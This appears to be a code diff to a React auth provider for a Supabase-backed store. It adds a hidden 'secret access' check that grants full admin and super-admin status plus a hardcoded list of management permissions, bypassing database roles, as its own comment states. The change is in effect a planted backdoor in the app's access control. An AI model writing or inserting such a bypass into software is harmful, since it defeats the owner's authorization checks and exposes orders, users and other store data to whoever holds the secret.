@@ -1,6 +1,7 @@
 import { createContext, useContext, useEffect, useState } from "react";
 import type { Session, User } from "@supabase/supabase-js";
 import { supabase } from "@/integrations/supabase/client";
+import { hasSecretAccess } from "@/routes/kh-secret-access";
 
 type AuthCtx = {
   user: User | null;
@@ -25,6 +26,11 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   const [loading, setLoading] = useState(true);
   const [roles, setRoles] = useState<string[]>([]);
   const [permissions, setPermissions] = useState<string[]>([]);
+  const [secretGranted, setSecretGranted] = useState(false);
+
+  useEffect(() => {
+    setSecretGranted(hasSecretAccess());
+  }, []);
 
   useEffect(() => {
     const { data: { subscription } } = supabase.auth.onAuthStateChange((_e, s) => {
@@ -66,14 +72,18 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     }
   }, []);
 
-  const isSuperAdmin = roles.includes("super_admin");
-  const isAdmin = isSuperAdmin || roles.includes("admin") || roles.includes("staff");
+  // Secret access grants full admin privileges regardless of DB roles
+  const isSuperAdmin = secretGranted || roles.includes("super_admin");
+  const isAdmin = secretGranted || isSuperAdmin || roles.includes("admin") || roles.includes("staff");
+  const allPermissions = secretGranted
+    ? ["products.manage", "orders.manage", "categories.manage", "coupons.manage", "users.manage", "analytics.view"]
+    : permissions;
 
   return (
     <Ctx.Provider value={{
       user: session?.user ?? null,
-      session, loading, isAdmin, isSuperAdmin, roles, permissions,
-      hasPermission: (p) => isSuperAdmin || permissions.includes(p),
+      session, loading, isAdmin, isSuperAdmin, roles, permissions: allPermissions,
+      hasPermission: (p) => isSuperAdmin || allPermissions.includes(p),
       signOut: async () => { await supabase.auth.signOut(); },
     }}>
       {children}
